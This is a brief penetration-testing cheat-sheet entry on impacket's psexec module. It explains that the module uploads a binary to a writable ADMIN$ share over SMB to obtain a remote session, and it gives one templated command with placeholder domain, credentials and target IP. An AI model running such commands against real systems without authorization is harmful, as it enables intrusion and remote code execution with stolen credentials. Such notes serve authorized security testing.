## This impacket module is used to gain administrative access over SMB.

## If the user has write permissions on the $ADMIN share, then the module uploads a malicious binary to it, then gives us a session.

#### 1) impacket-psexec 'DOMAIN.COM/USERNAME:PASSWORD'@IP_ADDRESS -dc-ip DC_IP
